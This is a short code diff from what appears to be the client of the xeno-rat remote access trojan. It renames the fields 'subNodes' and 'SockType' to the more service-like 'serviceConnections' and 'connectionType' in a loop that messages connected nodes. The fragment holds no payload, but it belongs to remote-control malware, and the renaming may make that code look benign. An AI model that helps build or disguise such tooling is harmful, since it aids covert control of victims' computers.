@@ -143,9 +143,9 @@ namespace xeno_rat_client
             {
                 if (Server != null)
                 {
-                    foreach (Node i in Server.subNodes)
+                    foreach (Node i in Server.serviceConnections)
                     {
-                        if (i.SockType == 1)
+                        if (i.connectionType == 1)
                         {
                             i.SendAsync(SocketHandler.Concat(new byte[] { 3 },
                                 Encoding.UTF8.GetBytes("Service restart required"))).Wait();
